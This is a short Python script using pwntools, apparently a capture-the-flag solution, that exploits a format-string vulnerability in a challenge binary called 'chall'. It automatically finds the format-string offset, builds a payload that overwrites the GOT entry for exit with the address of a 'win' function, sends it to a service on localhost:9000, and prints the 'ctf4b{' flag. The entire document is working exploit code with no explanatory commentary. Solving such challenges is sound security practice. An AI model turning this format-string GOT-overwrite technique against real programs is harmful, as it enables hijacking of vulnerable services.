from pwn import *

context.arch = "amd64"

elf = ELF("./chall")
p = remote("localhost", 9000)

# 0x000000000040133c <+406>:   call   0x4010b0 <exit@plt>
# format string attack

def exec_fmt(payload):
    proc = process("./chall")
    proc.sendlineafter(b">", payload)
    return proc.readline()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset
print(f"Offset: {offset}")

payload = fmtstr_payload(offset, {elf.got["exit"]: elf.symbols["win"]})
print(f"Payload: {payload}")
p.sendline(payload)

p.recvuntil(b"ctf4b{")
print("ctf4b{" + p.recvline().decode().strip())
